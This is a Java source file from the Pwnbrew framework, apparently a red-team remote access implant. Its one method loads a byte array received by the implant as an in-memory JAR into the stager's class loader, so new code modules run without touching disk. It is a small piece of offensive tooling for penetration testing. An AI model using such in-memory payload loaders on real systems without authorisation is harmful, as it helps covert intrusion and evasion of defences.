/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ActivityManager.java
 *
 *  Created on November 23, 2013
 */
package pwnbrew.activity;

import java.beans.IntrospectionException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.logging.Level;
import pwnbrew.log.RemoteLog;
import pwnbrew.misc.Utilities;

/**
 *
 *  
 */
public class ActivityManager {
    
    //Class name
    private static final String NAME_Class = ActivityManager.class.getSimpleName();
 
    //==================================================================
    /**
     *  Add the bytes like they are a JAR file
     * 
     * @param passsedBytes 
     */
    public static void loadActivity( byte[] passsedBytes ){
        
        try {
            
            Class stagerClass = Class.forName("stager.Stager");
            ClassLoader theLoader = stagerClass.getClassLoader(); 
            if( theLoader instanceof URLClassLoader ){
                
                //Cast the loader
                URLClassLoader aLD = (URLClassLoader)theLoader;
                
                //Call the create URL function of MemoryBufferURLConnection
                Class urlClass = Class.forName("MemoryBufferURLConnection");
                Method aMethod = urlClass.getMethod("createURL", new Class[]{byte[].class, String.class});
                Object anObj = (URL) aMethod.invoke(null, new Object[]{passsedBytes, "application/jar"});
                
                //Get the URL and register it
                if( anObj instanceof URL ){
                    URL aURL = (URL)anObj;
                    Utilities.addURLToClassLoader(aLD, aURL);
                }
                
            }
            
        } catch (ClassNotFoundException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (NoSuchMethodException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (SecurityException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (IllegalAccessException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (IllegalArgumentException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (InvocationTargetException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        } catch (IntrospectionException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "loadActivity()", ex.getMessage(), ex);        
        }
        
    }
    
}
